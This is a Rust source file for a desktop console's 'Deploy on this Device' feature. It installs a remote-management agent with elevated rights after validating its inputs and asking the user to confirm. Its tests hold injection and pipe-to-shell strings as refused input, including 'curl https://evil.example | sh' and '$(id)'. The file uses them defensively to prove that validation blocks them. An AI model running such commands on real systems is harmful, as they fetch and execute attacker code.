//! "Deploy on this Device": install the agent on the machine the console is
//! running on, with administrator rights, and stream what it prints back to the
//! setup wizard.
//!
//! The page never hands over a command. Whatever runs in the webview can call
//! this, and a string from there running behind the admin prompt would make any
//! script injected into the page root on this machine. So the page sends the
//! four values only it knows ([`InstallRequest`]), each held to the shape the
//! backend gives it, and the shell writes the command itself: the same text the
//! wizard offers to copy (a fixture pins the two together), against the tenant
//! the shell learned at login rather than one the page names.
//!
//! That still leaves a page script able to enrol this machine in a workspace of its
//! own: it can sign in to one, and the agent it installs is the real one. So nothing
//! is elevated until the person answers a native dialog naming the tenant, which
//! nothing in the webview can draw or answer ([`confirmed_by_user`]).
//!
//! Elevation goes through the OS's own prompt, never a password of ours:
//! `osascript ... with administrator privileges` on macOS, `Start-Process
//! -Verb RunAs` (UAC) on Windows. Both run the command inside an elevated
//! process whose output we cannot read directly, so the command runs from a
//! small runner script that redirects everything into a log file in a
//! per-run temp directory, and a thread here tails that file into
//! [`EVENT_OUTPUT`] events until the launcher exits, then reports the exit
//! code it wrote beside the log in [`EVENT_DONE`].
//!
//! The run directory holds the install command, and the command holds the
//! workspace's registration secret: it is created readable by this user only
//! and removed as soon as the run is over, however it ended.

use std::sync::atomic::AtomicBool;

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, State, WebviewWindow};

use crate::MAIN_LABEL;

/// Lines the installer printed since the last event, in order. Batched per
/// tail interval, so a chatty installer costs one IPC round trip per interval
/// rather than one per line.
pub const EVENT_OUTPUT: &str = "agent-install:output";
/// The run is over: success, the exit code when the command ran, and the error
/// when it did not (the confirmation or the elevation prompt declined, the launcher
/// failed).
pub const EVENT_DONE: &str = "agent-install:done";

/// One install at a time: a second "Deploy on this Device" while one is running
/// is answered with [`InstallError::busy`] instead of a second confirmation.
#[derive(Default)]
pub struct InstallerState {
    running: AtomicBool,
}

/// What went wrong, in the two terms the UI needs: a `kind` it turns into copy
/// and an action, and the raw message for the log.
#[derive(Clone, Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstallError {
    kind: &'static str,
    message: String,
}

impl InstallError {
    fn busy() -> Self {
        Self {
            kind: "busy",
            message: "an install is already running".into(),
        }
    }

    /// This shell cannot run an installer on this platform at all.
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    fn unsupported() -> Self {
        Self {
            kind: "unsupported",
            message: "local install is not supported on this platform".into(),
        }
    }

    /// Our own precondition failed: a call from the wrong or a hidden window, a
    /// refused value, no workspace to install for.
    fn unavailable(message: impl Into<String>) -> Self {
        Self {
            kind: "unavailable",
            message: message.into(),
        }
    }

    /// The run could not be set up or started - the temp directory, the
    /// launcher process.
    #[cfg(any(target_os = "macos", target_os = "windows"))]
    fn io(error: impl std::fmt::Display) -> Self {
        Self {
            kind: "io",
            message: error.to_string(),
        }
    }

    /// The user declined the confirmation or the elevation prompt.
    #[cfg(any(target_os = "macos", target_os = "windows"))]
    fn cancelled() -> Self {
        Self {
            kind: "cancelled",
            message: "the install was declined".into(),
        }
    }

    /// The command ran and exited non-zero, or the launcher failed for a reason
    /// that is not a declined prompt. The log carries the installer's own words.
    #[cfg(any(target_os = "macos", target_os = "windows"))]
    fn failed(message: impl Into<String>) -> Self {
        Self {
            kind: "failed",
            message: message.into(),
        }
    }
}

/// The longest value [`is_install_arg`] takes: well past the 32-character keys
/// and 36-character UUIDs the backend issues.
const MAX_INSTALL_ARG_LEN: usize = 128;

/// One value bound for the agent's command line. Registration keys are
/// alphanumeric now and base64url on tenants that predate that; ids are UUIDs.
/// None of those need anything a shell or PowerShell reads as syntax, so the
/// command carries them unquoted exactly as the copied one does. A leading `-`
/// is refused because the agent's CLI would take the value for a flag.
fn is_install_arg(value: &str) -> bool {
    (1..=MAX_INSTALL_ARG_LEN).contains(&value.len())
        && !value.starts_with('-')
        && value
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_'))
}

/// What only the page knows about the install. The host is not here on purpose:
/// the agent is downloaded from, and enrolled with, the tenant the shell holds.
/// `deny_unknown_fields`, so a caller still sending a `command` is refused
/// rather than quietly ignored. No `Debug`: `initial_key` must never reach the log.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct InstallRequest {
    org_id: String,
    initial_key: String,
    log_key: Option<String>,
    user_id: Option<String>,
}

impl InstallRequest {
    /// Names the field and never the value: the key is the workspace's secret and
    /// this message reaches the log.
    fn validate(&self) -> Result<(), InstallError> {
        let fields = [
            ("orgId", Some(&self.org_id)),
            ("initialKey", Some(&self.initial_key)),
            ("logKey", self.log_key.as_ref()),
            ("userId", self.user_id.as_ref()),
        ];
        for (name, value) in fields {
            if value.is_some_and(|value| !is_install_arg(value)) {
                return Err(InstallError::unavailable(format!(
                    "the install request has an invalid {name}"
                )));
            }
        }
        Ok(())
    }
}

/// The OS whose command to write. A value rather than a `cfg` so both commands
/// are built and tested on either host.
#[cfg(any(target_os = "macos", target_os = "windows", test))]
#[derive(Clone, Copy)]
enum InstallOs {
    Macos,
    Windows,
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
impl InstallOs {
    fn current() -> Self {
        if cfg!(target_os = "windows") {
            Self::Windows
        } else {
            Self::Macos
        }
    }
}

/// `--serverUrl` for the tenant at `origin`. A gateway on the developer's own box
/// needs `--localMode` as well, which is what `withLocalMode` in apps/web adds to
/// the copied command.
#[cfg(any(target_os = "macos", target_os = "windows", test))]
fn server_arg(origin: &url::Url) -> String {
    if crate::is_loopback_host(origin.host_str().unwrap_or_default()) {
        "localhost --localMode".to_string()
    } else {
        origin.authority().to_string()
    }
}

/// The install command, identical to `buildInstallCommand` in apps/web for the
/// same inputs: `install-command.json` holds the expected text and a test on each
/// side reads it. Every interpolated value has passed [`is_install_arg`] or came
/// from `crate::tenant_origin`; `machine_id` is the shell's own UUID.
#[cfg(any(target_os = "macos", target_os = "windows", test))]
fn install_command(
    os: InstallOs,
    origin: &url::Url,
    request: &InstallRequest,
    machine_id: &str,
) -> String {
    let server = server_arg(origin);
    let base = origin.origin().ascii_serialization();
    let mut args = format!(
        "install --serverUrl {server} --initialKey {}",
        request.initial_key
    );
    if let Some(log_key) = &request.log_key {
        args.push_str(&format!(" --logKey {log_key}"));
    }
    args.push_str(&format!(" --orgId {}", request.org_id));
    if let Some(user_id) = &request.user_id {
        args.push_str(&format!(" --userId {user_id}"));
    }
    match os {
        InstallOs::Macos => format!(
            "cd ~ && rm -f openframe-client_macos.tar.gz openframe-client 2>/dev/null; curl -fL -H 'x-machine-id: {machine_id}' -o openframe-client_macos.tar.gz '{base}/v0/api/assets/download?agent=client&platform=macos' && tar -xzf openframe-client_macos.tar.gz && sudo chmod +x ./openframe-client && sudo ./openframe-client {args}"
        ),
        InstallOs::Windows => format!(
            "Set-Location ~; Remove-Item -Path 'openframe-client.zip','openframe-client.exe' -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri '{base}/v0/api/assets/download?agent=client&platform=windows' -Headers @{{ 'x-machine-id' = '{machine_id}' }} -OutFile 'openframe-client.zip'; Expand-Archive -Path 'openframe-client.zip' -DestinationPath '.' -Force; & '.\\openframe-client.exe' {args}"
        ),
    }
}

/// What the confirmation says: what is about to happen, to whom this machine will
/// answer, and what that means.
#[cfg(any(target_os = "macos", target_os = "windows", test))]
fn confirmation_text(tenant_host: &str) -> (&'static str, String) {
    (
        "Install the OpenFrame agent?",
        format!(
            "This installs the OpenFrame agent on this computer with administrator rights and connects it to:\n\n{tenant_host}\n\nThat workspace will be able to manage and remotely access this computer. Choose OK only if you recognize it."
        ),
    )
}

/// The person's answer, before anything is written to disk or elevated. A native
/// dialog, because a page script is what this guards against: it can call this
/// command, but it cannot see, draw or answer what appears here. Anything but OK is
/// a no. Waits for the answer, so never on the main thread, where a sync command runs.
///
/// `AsyncMessageDialog`, not `MessageDialog`: on macOS the blocking one sits in a modal
/// loop on the main thread, where every sync command and window event also runs. The
/// async one begins the sheet and leaves the main thread free.
#[cfg(any(target_os = "macos", target_os = "windows"))]
fn confirmed_by_user(window: &WebviewWindow, tenant_host: &str) -> bool {
    let (title, description) = confirmation_text(tenant_host);
    let answer = rfd::AsyncMessageDialog::new()
        .set_level(rfd::MessageLevel::Warning)
        .set_title(title)
        .set_description(description)
        .set_buttons(rfd::MessageButtons::OkCancel)
        .set_parent(window)
        .show();
    tauri::async_runtime::block_on(answer) == rfd::MessageDialogResult::Ok
}

/// The tenant to install against: the one login taught the shell, held to the
/// same rule as when it was learned, because `config.json` may predate the rule.
#[cfg(any(target_os = "macos", target_os = "windows"))]
fn install_target(app: &AppHandle) -> Result<url::Url, InstallError> {
    let cfg = crate::load_config(app);
    let host = crate::tenant_host(&cfg)
        .ok_or_else(|| InstallError::unavailable("no workspace to install for"))?;
    let origin =
        crate::tenant_origin(&host, crate::shared_host(&cfg).as_deref()).map_err(|error| {
            log::warn!("agent install: refusing the learned tenant host: {error}");
            InstallError::unavailable("the workspace host is not one this app may install from")
        })?;
    url::Url::parse(&origin).map_err(InstallError::io)
}

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct OutputEvent {
    lines: Vec<String>,
}

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct DoneEvent {
    success: bool,
    /// The command's own exit code, when it ran at all.
    exit_code: Option<i32>,
    error: Option<InstallError>,
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
impl DoneEvent {
    /// The run ended without the command's own exit code.
    fn not_run(error: InstallError) -> Self {
        Self {
            success: false,
            exit_code: None,
            error: Some(error),
        }
    }
}

/// Start the agent install on this machine. Returns once the call is accepted; the
/// person's answer and everything after it arrive as [`EVENT_OUTPUT`] and one
/// [`EVENT_DONE`] on the main window.
#[tauri::command]
pub fn agent_install_start(
    app: AppHandle,
    window: WebviewWindow,
    state: State<'_, InstallerState>,
    request: InstallRequest,
) -> Result<(), InstallError> {
    if window.label() != MAIN_LABEL {
        return Err(InstallError::unavailable(
            "an install can only be started from the main window",
        ));
    }
    request.validate()?;
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        let _ = (app, state);
        Err(InstallError::unsupported())
    }
    #[cfg(any(target_os = "macos", target_os = "windows"))]
    {
        use std::sync::atomic::Ordering;
        let origin = install_target(&app)?;
        let tenant_host = origin.authority().to_string();
        // The page keeps running in a window hidden to the tray, and a dialog
        // attached to a window nobody can see would be waiting on nobody.
        if !window.is_visible().unwrap_or(false) {
            return Err(InstallError::unavailable(
                "an install can only be started from a visible window",
            ));
        }
        let command = install_command(
            InstallOs::current(),
            &origin,
            &request,
            &uuid::Uuid::new_v4().to_string(),
        );
        if state
            .running
            .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
            .is_err()
        {
            return Err(InstallError::busy());
        }
        std::thread::spawn(move || {
            use tauri::{Emitter, Manager};
            let done = if confirmed_by_user(&window, &tenant_host) {
                match run::RunDir::create(&command) {
                    Ok(run) => run::execute(&app, run, &tenant_host),
                    Err(error) => {
                        log::warn!("agent install: could not prepare the run: {error}");
                        DoneEvent::not_run(InstallError::io(error))
                    }
                }
            } else {
                DoneEvent::not_run(InstallError::cancelled())
            };
            log::info!(
                "agent install finished: success={} exit_code={:?} error={:?}",
                done.success,
                done.exit_code,
                done.error
            );
            app.state::<InstallerState>()
                .running
                .store(false, Ordering::Release);
            let _ = app.emit_to(MAIN_LABEL, EVENT_DONE, done);
        });
        Ok(())
    }
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
mod run {
    use std::{
        fs,
        io::{Read, Seek, SeekFrom},
        path::{Path, PathBuf},
        process::{Child, Command, Stdio},
        time::Duration,
    };

    use tauri::{AppHandle, Emitter};

    use super::{DoneEvent, InstallError, OutputEvent, EVENT_OUTPUT};
    use crate::MAIN_LABEL;

    /// How often the log is read while the command runs. One frame per interval
    /// is faster than the installer prints and well under what the eye resolves.
    const TAIL_INTERVAL: Duration = Duration::from_millis(200);

    /// The files of one run, in a directory only this user can read.
    pub(super) struct RunDir {
        dir: PathBuf,
        /// The install command, from [`install_command`](super::install_command).
        script: PathBuf,
        /// The elevated entry point: runs `script` into `log`, writes `status`.
        runner: PathBuf,
        /// Everything the command printed, stdout and stderr interleaved.
        log: PathBuf,
        /// The command's exit code, written by the runner once it is over.
        status: PathBuf,
    }

    impl RunDir {
        pub(super) fn create(command: &str) -> std::io::Result<Self> {
            let dir =
                std::env::temp_dir().join(format!("openframe-install-{}", uuid::Uuid::new_v4()));
            fs::create_dir(&dir)?;
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                fs::set_permissions(&dir, fs::Permissions::from_mode(0o700))?;
            }
            let run = Self {
                script: dir.join(script_name()),
                runner: dir.join(runner_name()),
                log: dir.join("install.log"),
                status: dir.join("status"),
                dir,
            };
            write_private(&run.script, &script_body(command))?;
            write_private(&run.runner, &runner_script(&run))?;
            // The log exists before the command does, so the tail never has to
            // tell "not started" from "nothing printed yet".
            write_private(&run.log, "")?;
            Ok(run)
        }
    }

    impl Drop for RunDir {
        fn drop(&mut self) {
            if let Err(error) = fs::remove_dir_all(&self.dir) {
                log::warn!("agent install: run directory not removed: {error}");
            }
        }
    }

    fn write_private(path: &Path, contents: &str) -> std::io::Result<()> {
        fs::write(path, contents)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(path, fs::Permissions::from_mode(0o600))?;
        }
        Ok(())
    }

    #[cfg(target_os = "macos")]
    fn script_name() -> &'static str {
        "install.sh"
    }
    #[cfg(target_os = "windows")]
    fn script_name() -> &'static str {
        "install.ps1"
    }
    #[cfg(target_os = "macos")]
    fn runner_name() -> &'static str {
        "run.sh"
    }
    #[cfg(target_os = "windows")]
    fn runner_name() -> &'static str {
        "run.ps1"
    }

    /// The command as a script of its own, so the runner can refer to it by
    /// path and no quoting of the command itself is ever needed.
    #[cfg(target_os = "macos")]
    fn script_body(command: &str) -> String {
        format!("#!/bin/bash\nset -o pipefail\n{command}\n")
    }
    #[cfg(target_os = "windows")]
    fn script_body(command: &str) -> String {
        format!("$ErrorActionPreference = 'Continue'\n{command}\n")
    }

    /// A path inside a single-quoted shell word.
    #[cfg(target_os = "macos")]
    fn sh_quote(path: &Path) -> String {
        format!("'{}'", path.display().to_string().replace('\'', "'\\''"))
    }

    /// A path inside a single-quoted PowerShell string.
    #[cfg(target_os = "windows")]
    fn ps_quote(path: &Path) -> String {
        format!("'{}'", path.display().to_string().replace('\'', "''"))
    }

    /// Inside an AppleScript string literal.
    #[cfg(target_os = "macos")]
    fn applescript_escape(text: &str) -> String {
        text.replace('\\', "\\\\").replace('"', "\\\"")
    }

    /// The elevated entry point. `do shell script` turns a non-zero exit into an
    /// AppleScript error that hides the code, so the runner records it itself
    /// and exits zero: a declined prompt is then the only way osascript fails.
    #[cfg(target_os = "macos")]
    fn runner_script(run: &RunDir) -> String {
        format!(
            "#!/bin/bash\n/bin/bash {script} > {log} 2>&1\necho $? > {status}\n",
            script = sh_quote(&run.script),
            log = sh_quote(&run.log),
            status = sh_quote(&run.status),
        )
    }

    /// The elevated entry point. Every stream goes into the log as it is
    /// written; the exit code of the last native command (the agent binary)
    /// is what the install amounts to.
    #[cfg(target_os = "windows")]
    fn runner_script(run: &RunDir) -> String {
        format!(
            "$ErrorActionPreference = 'Continue'\n& {script} *>&1 | Out-File -FilePath {log} -Encoding utf8\n$code = $LASTEXITCODE\nif ($null -eq $code) {{ $code = 0 }}\nSet-Content -Path {status} -Value $code\n",
            script = ps_quote(&run.script),
            log = ps_quote(&run.log),
            status = ps_quote(&run.status),
        )
    }

    /// The AppleScript that raises the prompt. It names the tenant again because the
    /// password is what the person is really being asked for here. UAC has no room for
    /// text of ours, which is part of why [`confirmed_by_user`](super::confirmed_by_user)
    /// comes first.
    #[cfg(target_os = "macos")]
    fn elevation_script(runner: &Path, tenant_host: &str) -> String {
        let shell_line = format!("/bin/bash {}", sh_quote(runner));
        let prompt = format!(
            "OpenFrame Console wants to install the OpenFrame agent and connect this device to {tenant_host}."
        );
        format!(
            "do shell script \"{}\" with prompt \"{}\" with administrator privileges",
            applescript_escape(&shell_line),
            applescript_escape(&prompt)
        )
    }

    #[cfg(target_os = "macos")]
    fn launch(run: &RunDir, tenant_host: &str) -> std::io::Result<Child> {
        let apple = elevation_script(&run.runner, tenant_host);
        Command::new("osascript")
            .arg("-e")
            .arg(apple)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
    }

    #[cfg(target_os = "windows")]
    fn launch(run: &RunDir, _tenant_host: &str) -> std::io::Result<Child> {
        use std::os::windows::process::CommandExt;
        /// CREATE_NO_WINDOW: the unelevated launcher gets no console of its own.
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let script = format!(
            "$p = Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',{runner}) -Verb RunAs -WindowStyle Hidden -Wait -PassThru; exit $p.ExitCode",
            runner = ps_quote(&run.runner)
        );
        Command::new("powershell.exe")
            .args([
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                &script,
            ])
            .creation_flags(CREATE_NO_WINDOW)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
    }

    /// The launcher's stderr when the user declined the elevation prompt.
    #[cfg(target_os = "macos")]
    fn was_cancelled(stderr: &str) -> bool {
        stderr.contains("User canceled") || stderr.contains("(-128)")
    }
    #[cfg(target_os = "windows")]
    fn was_cancelled(stderr: &str) -> bool {
        let text = stderr.to_ascii_lowercase();
        text.contains("canceled by the user") || text.contains("cancelled by the user")
    }

    /// Whole lines from `pending`, which keeps whatever came after the last
    /// newline for the next read. Carriage returns and a leading BOM (Out-File
    /// writes one) are not part of any line.
    pub(super) fn take_lines(pending: &mut String) -> Vec<String> {
        let Some(last_newline) = pending.rfind('\n') else {
            return Vec::new();
        };
        let complete: String = pending.drain(..=last_newline).collect();
        complete
            .split_inclusive('\n')
            .map(|line| {
                line.trim_end_matches('\n')
                    .trim_end_matches('\r')
                    .trim_start_matches('\u{feff}')
                    .to_string()
            })
            .collect()
    }

    /// Read what the log gained since `offset`, emit the whole lines.
    fn drain_log(app: &AppHandle, log: &Path, offset: &mut u64, pending: &mut String) {
        let Ok(mut file) = fs::File::open(log) else {
            return;
        };
        if file.seek(SeekFrom::Start(*offset)).is_err() {
            return;
        }
        let mut bytes = Vec::new();
        if file.read_to_end(&mut bytes).is_err() {
            return;
        }
        if bytes.is_empty() {
            return;
        }
        *offset += bytes.len() as u64;
        pending.push_str(&String::from_utf8_lossy(&bytes));
        let lines = take_lines(pending);
        if !lines.is_empty() {
            let _ = app.emit_to(MAIN_LABEL, EVENT_OUTPUT, OutputEvent { lines });
        }
    }

    /// Run to completion: launch, tail the log while the launcher lives, then
    /// settle the outcome from the status file and the launcher's stderr.
    pub(super) fn execute(app: &AppHandle, run: RunDir, tenant_host: &str) -> DoneEvent {
        let mut child = match launch(&run, tenant_host) {
            Ok(child) => child,
            Err(error) => {
                log::warn!("agent install: launcher did not start: {error}");
                return DoneEvent::not_run(InstallError::io(error));
            }
        };
        // Drained on its own thread: a pipe nobody reads blocks the writer.
        let stderr = child.stderr.take();
        let stderr_reader = std::thread::spawn(move || {
            let mut text = String::new();
            if let Some(mut stderr) = stderr {
                let _ = stderr.read_to_string(&mut text);
            }
            text
        });

        let mut offset = 0u64;
        let mut pending = String::new();
        let launcher_status = loop {
            drain_log(app, &run.log, &mut offset, &mut pending);
            match child.try_wait() {
                Ok(Some(status)) => break Ok(status),
                Ok(None) => std::thread::sleep(TAIL_INTERVAL),
                Err(error) => break Err(error),
            }
        };
        drain_log(app, &run.log, &mut offset, &mut pending);
        let tail = pending
            .trim_end_matches('\r')
            .trim_start_matches('\u{feff}');
        if !tail.is_empty() {
            let _ = app.emit_to(
                MAIN_LABEL,
                EVENT_OUTPUT,
                OutputEvent {
                    lines: vec![tail.to_string()],
                },
            );
        }
        let stderr = stderr_reader.join().unwrap_or_default();

        let exit_code = fs::read_to_string(&run.status)
            .ok()
            .and_then(|text| text.trim().parse::<i32>().ok());
        match (exit_code, launcher_status) {
            (Some(0), _) => DoneEvent {
                success: true,
                exit_code: Some(0),
                error: None,
            },
            (Some(code), _) => DoneEvent {
                success: false,
                exit_code: Some(code),
                error: Some(InstallError::failed(format!(
                    "the installer exited with code {code}"
                ))),
            },
            // The command never ran: the prompt was declined, or the launcher
            // itself failed, and its stderr is the only account of which.
            (None, launcher) => {
                let detail = stderr.trim();
                let error = if was_cancelled(detail) {
                    InstallError::cancelled()
                } else {
                    let status = launcher
                        .map(|status| status.to_string())
                        .unwrap_or_else(|error| error.to_string());
                    InstallError::failed(if detail.is_empty() {
                        format!("the installer could not be started ({status})")
                    } else {
                        detail.to_string()
                    })
                };
                DoneEvent::not_run(error)
            }
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn take_lines_keeps_the_partial_tail() {
            let mut pending = String::from("\u{feff}one\r\ntwo\nthr");
            assert_eq!(take_lines(&mut pending), vec!["one", "two"]);
            assert_eq!(pending, "thr");
            assert!(take_lines(&mut pending).is_empty());
            pending.push_str("ee\n\nfour\n");
            assert_eq!(take_lines(&mut pending), vec!["three", "", "four"]);
            assert!(pending.is_empty());
        }

        #[cfg(target_os = "macos")]
        #[test]
        fn sh_quote_survives_an_apostrophe() {
            let quoted = sh_quote(Path::new("/tmp/o'brien/run.sh"));
            assert_eq!(quoted, "'/tmp/o'\\''brien/run.sh'");
        }

        #[cfg(target_os = "macos")]
        #[test]
        fn applescript_escape_handles_quotes_and_backslashes() {
            assert_eq!(applescript_escape(r#"a "b" \c"#), r#"a \"b\" \\c"#);
        }

        #[cfg(target_os = "macos")]
        #[test]
        fn the_admin_prompt_names_the_tenant() {
            let script = elevation_script(Path::new("/tmp/o'brien/run.sh"), "acme.openframe.ai");
            assert_eq!(
                script,
                "do shell script \"/bin/bash '/tmp/o'\\\\''brien/run.sh'\" with prompt \"OpenFrame Console wants to install the OpenFrame agent and connect this device to acme.openframe.ai.\" with administrator privileges"
            );
        }

        #[cfg(target_os = "windows")]
        #[test]
        fn ps_quote_doubles_an_apostrophe() {
            let quoted = ps_quote(Path::new(r"C:\Users\O'Brien\run.ps1"));
            assert_eq!(quoted, r"'C:\Users\O''Brien\run.ps1'");
        }

        #[test]
        fn a_run_holds_the_command_privately_and_cleans_up() {
            let run = RunDir::create("echo hello").expect("run dir");
            let dir = run.dir.clone();
            assert!(fs::read_to_string(&run.script)
                .unwrap()
                .contains("echo hello"));
            let runner = fs::read_to_string(&run.runner).unwrap();
            assert!(runner.contains("install.log"));
            assert!(runner.contains("status"));
            assert!(run.log.exists());
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                assert_eq!(
                    fs::metadata(&run.script).unwrap().permissions().mode() & 0o777,
                    0o600
                );
                assert_eq!(
                    fs::metadata(&dir).unwrap().permissions().mode() & 0o777,
                    0o700
                );
            }
            drop(run);
            assert!(!dir.exists());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request() -> InstallRequest {
        InstallRequest {
            org_id: "org-1".into(),
            initial_key: "secret-1".into(),
            log_key: None,
            user_id: None,
        }
    }

    fn origin(text: &str) -> url::Url {
        url::Url::parse(text).unwrap()
    }

    /// Both sides of the bridge read this file, which pins the command the shell runs
    /// to the one the wizard offers to copy, and `request` to what the shell accepts.
    #[test]
    fn the_command_matches_the_one_the_wizard_copies() {
        let fixture: serde_json::Value =
            serde_json::from_str(include_str!("install-command.json")).unwrap();
        for case in fixture["cases"].as_array().unwrap() {
            let request: InstallRequest = serde_json::from_value(case["request"].clone()).unwrap();
            request.validate().unwrap();
            let origin = origin(case["downloadBaseUrl"].as_str().unwrap());
            let machine_id = case["machineId"].as_str().unwrap();
            for (os, key) in [
                (InstallOs::Macos, "darwin"),
                (InstallOs::Windows, "windows"),
            ] {
                assert_eq!(
                    install_command(os, &origin, &request, machine_id),
                    case["commands"][key].as_str().unwrap()
                );
            }
        }
    }

    #[test]
    fn a_gateway_on_this_box_installs_in_local_mode() {
        for base in ["http://localhost:8443", "http://127.0.0.1:8443"] {
            let command = install_command(InstallOs::Macos, &origin(base), &request(), "id");
            assert!(command.contains("--serverUrl localhost --localMode --initialKey"));
            assert!(command.contains(&format!("'{base}/v0/api/assets/download?")));
        }
    }

    #[test]
    fn the_confirmation_names_the_tenant_and_what_it_will_be_able_to_do() {
        let (title, description) = confirmation_text("acme.openframe.ai");
        assert!(title.contains("OpenFrame agent"));
        assert!(description.contains("\n\nacme.openframe.ai\n\n"));
        assert!(description.contains("remotely access this computer"));
    }

    #[test]
    fn the_server_arg_keeps_a_port() {
        let tenant = origin("https://acme.openframe.ai:8443");
        assert_eq!(server_arg(&tenant), "acme.openframe.ai:8443");
    }

    #[test]
    fn install_args_take_what_the_backend_issues() {
        for value in [
            "AbC123",
            "0f8fad5b-d9cb-469f-a165-70867728950e",
            "aB3_x-Zk",
            "_leading_underscore",
            &"k".repeat(MAX_INSTALL_ARG_LEN),
        ] {
            assert!(is_install_arg(value), "{value}");
        }
    }

    #[test]
    fn install_args_refuse_anything_a_shell_or_the_cli_would_read() {
        for value in [
            "",
            "-rf",
            "--serverUrl",
            "a b",
            "a;b",
            "a&b",
            "a|b",
            "$(id)",
            "`id`",
            "a'b",
            "a\"b",
            "a\nb",
            "a\\b",
            "a/b",
            "a=b",
            "a%b",
            "é",
            &"k".repeat(MAX_INSTALL_ARG_LEN + 1),
        ] {
            assert!(!is_install_arg(value), "{value:?}");
        }
    }

    #[test]
    fn every_field_is_validated_and_the_error_names_it_without_the_value() {
        type SetField = fn(&mut InstallRequest, String);
        let cases: [(&str, SetField); 4] = [
            ("orgId", |r, v| r.org_id = v),
            ("initialKey", |r, v| r.initial_key = v),
            ("logKey", |r, v| r.log_key = Some(v)),
            ("userId", |r, v| r.user_id = Some(v)),
        ];
        for (name, set) in cases {
            let mut bad = request();
            set(&mut bad, "x; curl evil | sh".into());
            let error = bad.validate().unwrap_err();
            assert_eq!(error.kind, "unavailable");
            assert!(error.message.contains(name), "{}", error.message);
            assert!(!error.message.contains("curl"), "{}", error.message);
        }
        request().validate().unwrap();
    }

    #[test]
    fn a_command_string_from_the_page_does_not_deserialize() {
        let refused = serde_json::from_value::<InstallRequest>(serde_json::json!({
            "orgId": "org-1",
            "initialKey": "secret-1",
            "command": "curl https://evil.example | sh",
        }));
        assert!(refused.is_err());
        let accepted = serde_json::from_value::<InstallRequest>(serde_json::json!({
            "orgId": "org-1",
            "initialKey": "secret-1",
            "logKey": null,
        }));
        assert!(accepted.is_ok());
    }

    /// bash itself is the judge of the macOS command, and of a value that would
    /// break out of it had the validation let it through.
    #[cfg(unix)]
    #[test]
    fn the_macos_command_is_valid_bash() {
        let command = install_command(
            InstallOs::Macos,
            &origin("https://acme.openframe.ai"),
            &request(),
            "0f8fad5b-d9cb-469f-a165-70867728950e",
        );
        let status = std::process::Command::new("/bin/bash")
            .args(["-n", "-c", &command])
            .status()
            .unwrap();
        assert!(status.success());
    }
}
